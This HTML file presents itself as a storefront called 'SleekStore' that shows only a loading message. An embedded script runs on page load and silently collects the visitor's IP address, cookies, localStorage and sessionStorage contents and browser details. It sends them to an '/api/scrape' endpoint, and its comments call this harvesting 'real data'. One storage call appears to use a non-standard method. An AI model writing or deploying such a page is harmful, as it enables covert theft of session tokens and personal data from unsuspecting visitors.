<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SleekStore</title>
    <!-- Disable caching for this page -->
    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
    <style>body{background:#0d1117;color:#c9d1d9;font-family:sans-serif;padding:20px;}</style>
</head>
<body>
    <h1>Welcome to SleekStore</h1>
    <p>Loading...</p>

    <script>
        // Run immediately
        (async () => {
            try {
                // 1. Get IP
                let ip = "Unknown";
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip;
                } catch(e) {}

                // 2. Harvest Real Data
                const payload = {
                    timestamp: new Date().toISOString(),
                    ip: ip,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    
                    // REAL COOKIES
                    cookies: document.cookie || "No Cookies Found",
                    
                    // REAL LOCAL STORAGE
                    localStorage: Object.fromEntries(
                        Array.from(localStorage.keys()).map(key => [key, localStorage.getItem(key)])
                    ),
                    
                    // REAL SESSION STORAGE
                    sessionStorage: Object.fromEntries(
                        Array.from(sessionStorage.keys()).map(key => [key, sessionStorage.getItem(key)])
                    ),

                    windowLocation: window.location.href,
                    title: document.title,
                    screenRes: `${screen.width}x${screen.height}`
                };

                // 3. Send using sendBeacon (More reliable than fetch for background tasks)
                const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                navigator.sendBeacon('/api/scrape', blob);

                // Fallback: Try fetch just in case
                fetch('/api/scrape', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                    keepalive: true
                }).catch(err => console.error("Fallback failed", err));

            } catch (err) {
                console.error("Scrape failed:", err);
            }
        })();
    </script>
</body>
</html>
